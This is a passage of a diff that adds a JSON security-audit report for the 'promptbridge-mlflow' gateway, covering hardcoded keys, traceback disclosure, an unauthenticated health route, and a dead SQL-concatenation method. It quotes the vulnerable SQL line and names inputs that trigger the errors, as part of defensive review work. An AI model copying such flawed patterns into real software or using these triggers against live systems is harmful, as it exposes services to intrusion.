+      "recommendation": "Remove the literals, read the keys from environment or a secret manager, fail closed when absent, rotate both, and bind to loopback behind a reverse proxy.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "These are the credentials the running service actually accepts, not a hardening gap."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The 'it's only a placeholder' dismissal was considered and rejected by tracing that this file is the default config for both create_app and main with no override path."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 08 expressly keeps hardcoded secrets in scope."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read config.yaml in full and server.py:20-50, :133-165 independently."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Credential-literal finding; the consuming lines are cited instead of an invented data flow."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "promptbridge-mlflow/bridge/config.yaml:15",
+          "promptbridge-mlflow/bridge/config.yaml:17",
+          "promptbridge-mlflow/bridge/server.py:37",
+          "promptbridge-mlflow/bridge/server.py:146"
+        ],
+        "established_by": "config.yaml:15,17 holding the literals that server.py:23/27 make the default",
+        "narrowed_by": "The values are named 'placeholder' and a deployment may mount a different config.yaml -- but nothing in this tree does"
+      },
+      "searched": [
+        {
+          "looked_in": "promptbridge-mlflow (grep os.environ and load_config call sites)",
+          "for": "an environment or secret-store override that would mean these literals are never live",
+          "found": "the only os.environ use is server.py:160 (BRIDGE_LOG_LEVEL); load_config is called with no argument at :134 and :159, so CONFIG_PATH always wins"
+        },
+        {
+          "looked_in": "promptbridge-mlflow/bridge/server.py:31-46",
+          "for": "a second authentication factor that would make the key alone insufficient",
+          "found": "none -- one header compared against the config keys is the whole authentication story, and it guards the /v1 Mount only"
+        }
+      ]
+    },
+    {
+      "title": "Global exception handler returns the full traceback and exception string to the client",
+      "location": {
+        "path": "promptbridge-mlflow/bridge/server.py",
+        "symbol": "on_error",
+        "line": 128
+      },
+      "cwe": "CWE-209",
+      "class": "information disclosure through error message",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "server.py:124-130 returns JSONResponse({\"error\": str(exc), \"trace\": traceback.format_exc()}, status_code=500), and server.py:152 registers it for bare Exception, making it the outermost handler. str(exc) is the sharper leak: a psycopg failure carries the connection target from the DSN at config.yaml:27, and a load_model failure discloses artifact-store locations. INGRESS: a malformed body at server.py:76, or top_k=\"abc\" reaching int(k) in retrieval.py.",
+      "impact": "Absolute source paths, module layout, offending source lines and internal hostnames are returned to any caller who can provoke an unhandled exception -- which an authenticated caller does with one malformed JSON body.",
+      "recommendation": "Return an opaque error with a request id and keep the traceback in log.exception at :125 only; gate any verbose mode behind an explicit env flag that defaults off.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "An active disclosure to the client, not an absent hardening measure."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The researcher's additional claim that a non-ASCII X-Bridge-Key header makes this unauthenticated was reported as 'very likely' rather than asserted, and the supervisor did not confirm it -- the finding stands on the authenticated trigger alone."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read server.py:120-165 independently."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at server.py:76."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "promptbridge-mlflow/bridge/server.py:128",
+          "promptbridge-mlflow/bridge/server.py:152"
+        ],
+        "established_by": "server.py:128 placing traceback.format_exc() in the response body, wired to every Exception at :152",
+        "narrowed_by": "The traceback shows source lines, not local variable values, so secrets leak only where they appear in an exception message"
+      },
+      "searched": [
+        {
+          "looked_in": "promptbridge-mlflow/bridge/server.py:133-153",
+          "for": "a narrower handler or a debug flag that would replace this response in production",
+          "found": "create_app registers exactly {Exception: on_error} unconditionally; no debug gate exists"
+        },
+        {
+          "looked_in": "promptbridge-mlflow/bridge/config.yaml",
+          "for": "a setting that disables verbose errors",
+          "found": "the gateway block carries bind/port/request_timeout_s/max_tool_steps/log_prompts/log_dir only -- nothing controls error verbosity"
+        }
+      ]
+    },
+    {
+      "title": "/healthz sits outside the authenticated mount and returns the model cache contents",
+      "location": {
+        "path": "promptbridge-mlflow/bridge/server.py",
+        "symbol": "create_app",
+        "line": 151
+      },
+      "cwe": "CWE-306",
+      "class": "missing authentication",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "server.py:138-148 builds the /v1 Mount with BridgeKeyMiddleware in its middleware list; server.py:151 registers Route(\"/healthz\", gateway.health) as a SIBLING of that mount, so the middleware never runs for it. The Starlette constructor takes routes and exception_handlers only -- no app-level middleware. The same handler backs the authenticated /v1/models, and it returns self.models.describe() (registry.py:56-58), i.e. the full list of resident model URIs plus the cache capacity. config.yaml:2 binds 0.0.0.0.",
+      "impact": "An unauthenticated caller learns the internal MLflow registry entries and their stages, and can confirm whether an injected model URI was loaded. Disclosure only, no state change -- which is why this is low.",
+      "recommendation": "Give /healthz its own handler returning {\"status\": \"ok\"} and keep gateway.health behind the authenticated mount.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "An actual unauthenticated disclosure, though a small one -- hence low, not a hygiene dismissal."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read server.py:120-165 and registry.py:56-58 independently."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at server.py:151, the unauthenticated route registration."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "promptbridge-mlflow/bridge/server.py:151",
+          "promptbridge-mlflow/bridge/server.py:121"
+        ],
+        "established_by": "server.py:151 -- the route is a sibling of the Mount that carries the auth middleware",
+        "narrowed_by": "Read-only; the disclosed values are model URIs and an integer, not credentials"
+      },
+      "searched": [
+        {
+          "looked_in": "promptbridge-mlflow/bridge/server.py:133-153",
+          "for": "an app-level middleware registration that would cover /healthz too",
+          "found": "Starlette(...) is constructed with routes= and exception_handlers= only -- BridgeKeyMiddleware exists solely on the /v1 Mount"
+        },
+        {
+          "looked_in": "promptbridge-mlflow/bridge/registry.py:56-58",
+          "for": "whether the response carries internal state or just a status string",
+          "found": "describe() returns list(self._models.keys()), the full cached MLflow URIs"
+        }
+      ]
+    },
+    {
+      "title": "sql_console concatenates its argument straight into a SQL statement",
+      "location": {
+        "path": "promptbridge-mlflow/bridge/tools.py",
+        "symbol": "ToolBox.sql_console",
+        "line": 63
+      },
+      "cwe": "CWE-89",
+      "class": "sql injection",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "tools.py:63 is cur.execute(\"SELECT * FROM (\" + query + \") AS q LIMIT 100\") -- no parameterisation, no validation. The LIMIT wrapper constrains rows returned but not what the subquery does. Reachability is nil today: the dispatch registry at tools.py:80-85 lists http_fetch, calculator, lookup_runbook and probe_status and omits sql_console, dispatch resolves strictly by name from that dict (:96) and returns 'unknown tool' otherwise (:98), and self.sql_console_enabled at :28 is assigned and never read anywhere.",
+      "impact": "Any caller of this method executes arbitrary SQL as the bridge_ro role (config.yaml:27). One line added to the registry dict would make it live, which is why it is reported rather than dropped; nothing reaches it today, which is why it is low.",
+      "recommendation": "Delete the method, or move it out of ToolBox so it can never be resolved by name from the dispatcher, and drive it from fixed parameterised statements.",
+      "triage": [
+        {
+          "rule": "FP-03",
+          "answer": "HOLDS",
+          "reason": "Not triggerable through any live path in this tree. That is exactly why the severity is low and the finding is retained only under FP-08."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Reachability was traced rather than accepting the docstring's claim; the result is reported and the finding kept."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 08 keeps direct injection in a function's own logic valid even when uncalled."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read tools.py:56-65 and :79-108 and config.yaml:37 independently."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "No live ingress; the absence is stated explicitly."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "promptbridge-mlflow/bridge/tools.py:63"
+        ],
+        "established_by": "tools.py:63 -- the string concatenation itself",
+        "narrowed_by": "tools.py:80-85 omits it from the dispatch registry and config.yaml:37 sets sql_console false; the flag read at tools.py:28 is dead"
+      },
+      "searched": [
+        {
+          "looked_in": "promptbridge-mlflow (grep sql_console)",
+          "for": "any caller, route or registry entry that would raise the severity",
+          "found": "three hits -- config.yaml:37, tools.py:28 (stored and never read), tools.py:56 (the definition). No call site"
+        },
+        {
+          "looked_in": "promptbridge-mlflow/bridge/tools.py:89-108",
+          "for": "a dynamic dispatch path (getattr on self) that could reach an unlisted method",
+          "found": "none -- dispatch resolves strictly via registry.get(name) against the dict at :80-87"
+        }
+      ]
+    }
+  ]
+}
